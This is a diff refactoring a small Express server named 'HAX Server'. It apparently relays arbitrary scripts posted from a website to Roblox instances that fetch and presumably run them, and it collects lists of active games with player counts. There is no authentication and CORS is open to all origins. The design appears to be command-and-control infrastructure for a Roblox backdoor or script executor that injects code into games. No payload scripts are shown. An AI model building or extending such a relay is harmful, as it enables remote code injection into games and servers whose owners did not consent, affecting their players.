@@ -1,7 +1,7 @@
 const express = require('express');
 const app = express();
 
-// Enable CORS for all routes
+// Enable CORS
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -12,19 +12,7 @@ app.use((req, res, next) => {
     next();
 });
 
-// Parse JSON and text bodies with error handling
-app.use(express.json({
-    limit: '10mb',
-    verify: (req, res, buf) => {
-        try {
-            JSON.parse(buf);
-        } catch (e) {
-            res.status(400).json({ error: 'Invalid JSON' });
-            throw new Error('Invalid JSON');
-        }
-    }
-}));
-
+app.use(express.json({ limit: '10mb' }));
 app.use(express.text({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
@@ -32,13 +20,13 @@ let latestScript = "";
 let gamesData = [];
 let globalPlayers = 0;
 
-// Error handling middleware
+// Error handling
 app.use((err, req, res, next) => {
     console.error('Error:', err.message);
     res.status(500).json({ error: 'Internal server error' });
 });
 
-// Debug endpoint
+// Test endpoint
 app.get('/api/test', (req, res) => {
     res.json({ 
         status: 'online', 
@@ -48,7 +36,7 @@ app.get('/api/test', (req, res) => {
     });
 });
 
-// Website POSTs script here
+// Website POSTs script
 app.post('/api/execute', (req, res) => {
     try {
         latestScript = req.body || "";
@@ -60,7 +48,7 @@ app.post('/api/execute', (req, res) => {
     }
 });
 
-// Roblox GETs script from here
+// Roblox GETs script
 app.get('/api/execute', (req, res) => {
     try {
         res.send(latestScript || "");
@@ -71,51 +59,44 @@ app.get('/api/execute', (req, res) => {
     }
 });
 
-// Roblox POSTs game data here
+// Roblox POSTs game data
 app.post('/api/games/update', (req, res) => {
     try {
-        console.log('Raw request body type:', typeof req.body);
+        console.log('Game data received');
         
         let data;
         if (typeof req.body === 'string') {
-            if (req.body.trim() === '') {
+            try {
+                data = JSON.parse(req.body);
+            } catch {
                 data = { games: [], globalPlayers: 0 };
-            } else {
-                try {
-                    data = JSON.parse(req.body);
-                } catch (e) {
-                    console.error('JSON parse error:', e);
-                    data = { games: [], globalPlayers: 0 };
-                }
             }
-        } else if (req.body && typeof req.body === 'object') {
-            data = req.body;
         } else {
-            data = { games: [], globalPlayers: 0 };
+            data = req.body || { games: [], globalPlayers: 0 };
         }
         
-        gamesData = data.games || [];
+        // Only store games with players > 0
+        const allGames = data.games || [];
+        gamesData = allGames.filter(game => parseInt(game.players) > 0);
         globalPlayers = data.globalPlayers || 0;
         
-        console.log('Games updated:', gamesData.length, 'games,', globalPlayers, 'players');
+        console.log('Active games:', gamesData.length, 'Total players:', globalPlayers);
         res.status(200).send('OK');
     } catch (e) {
         console.error('Error updating games:', e);
-        res.status(200).send('OK'); // Still return OK to not break Roblox
+        res.status(200).send('OK');
     }
 });
 
-// Website GETs game data here
+// Website GETs game data
 app.get('/api/games', (req, res) => {
     try {
-        console.log('Games requested');
         res.json({
             total: gamesData.length,
             players: globalPlayers || 0,
             games: gamesData
         });
     } catch (e) {
-        console.error('Error getting games:', e);
         res.json({ total: 0, players: 0, games: [] });
     }
 });
@@ -140,12 +121,7 @@ process.on('unhandledRejection', (err) => {
 });
 
 const port = process.env.PORT || 3000;
-const server = app.listen(port, () => {
+app.listen(port, () => {
     console.log(`HAX Server running on port ${port}`);
     console.log(`API URL: https://hax-api-xdi2.onrender.com`);
-});
-
-// Handle server errors
-server.on('error', (err) => {
-    console.error('Server error:', err);
 });
